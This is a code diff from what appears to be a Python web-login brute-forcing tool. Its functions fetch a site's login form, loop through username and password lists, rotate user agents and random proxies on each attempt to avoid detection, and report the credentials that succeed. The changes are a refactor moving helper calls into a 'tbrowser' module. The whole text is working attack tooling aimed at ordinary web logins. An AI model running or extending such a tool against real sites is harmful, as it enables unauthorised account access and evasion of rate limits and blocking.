@@ -2,9 +2,9 @@
 ## NO oop
 
 import mechanize, sys
-from core import utils, actions
+from core import utils, actions, tbrowser
 
-def actionGatherFormInfo(optionURL):
+def parseFormInfo(optionURL):
 	######################################
 	#	Test connect to URL
 	#	Fetch login field
@@ -14,19 +14,21 @@ def actionGatherFormInfo(optionURL):
 
 
 	try:
-		process = actions.startBrowser()
-		user_agent = actions.getUserAgent()
+		process = tbrowser.startBrowser()
+		user_agent = tbrowser.useragent()
+
 		process.addheaders = [('User-Agent', user_agent)]
+		
 		process.open(optionURL)
 		#utils.printf("Connected. Getting form information...", "good")
-		formLoginID, formUserfield, formPasswdfield = actions.getFormInformation(process.forms())
+		
+		formLoginID, formUserfield, formPasswdfield = tbrowser.getLoginForm(process.forms())
 		#utils.printf("Found login form", "good")
-		process.close()
 		return formLoginID, formUserfield, formPasswdfield
-	except TypeError:
+	except TypeError as error:
 		#utils.printf("Can not find login form", "bad")
 		#sys.exit(1)
-		utils.die("Can not find login form", TypeError)
+		utils.die("Can not find login form", error)
 
 	except Exception as error:
 		#utils.printf(error, "bad")
@@ -48,7 +50,7 @@ def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyList
 	############################################
 
 	#	Get login form field informations
-	frmLoginID, frmUserfield, frmPassfield = actionGatherFormInfo(optionURL)
+	frmLoginID, frmUserfield, frmPassfield = parseFormInfo(optionURL)
 	#	Get single Username in username list / file
 	for tryUsername in optionUserlist:
 		#	If tryUsername is file object, remove \n
@@ -60,7 +62,7 @@ def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyList
 			pass
 
 		######	new test code block
-		proc = actions.startBrowser()
+		proc = tbrowser.startBrowser()
 		# proc = mechanize.Browser()
 		# proc.set_handle_robots(False)
 		######
@@ -71,10 +73,12 @@ def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyList
 			tryPassword = tryPassword.replace('\n', '')
 
 			#	New test code block: add new user_agent each try
-			user_agent = actions.getUserAgent()
+			user_agent = tbrowser.useragent()
 			proc.addheaders = [('User-Agent', user_agent)]
-
-
+			
+			#print "Debug: %s:%s" %(tryUsername, tryPassword)
+			
+			
 			if setProxyList:
 				#Set proxy connect
 				proxyAddr = actions.randomFromList(setProxyList)
@@ -83,14 +87,6 @@ def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyList
 
 			proc.open(optionURL)
 			#	End new code block
-
-			########	Old good code block
-			# proc = mechanize.Browser()
-			# user_agent = actions.getUserAgent()
-			# proc.addheaders = [('User-Agent', user_agent)]
-			# proc.set_handle_robots(False)
-			# proc.open(optionURL)
-			########	End good code block
 
 			try:
 				idxTry += 1
@@ -111,11 +107,15 @@ def handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxyList
 
 				#	If no login form -> success
 				#	TODO improve condition to use captcha
-				if not actions.getFormInformation(proc.forms()):
+				if not tbrowser.getLoginForm(proc.forms()):
 
 					#TODO edit mixed condition
 					if setKeyFalse:
 						if setKeyFalse not in proc.response().read():
+							
+							# Add creds to success list
+							# If verbose: print
+							
 							printSuccess(tryUsername, tryPassword)
 
 							#	Clear object and try new username
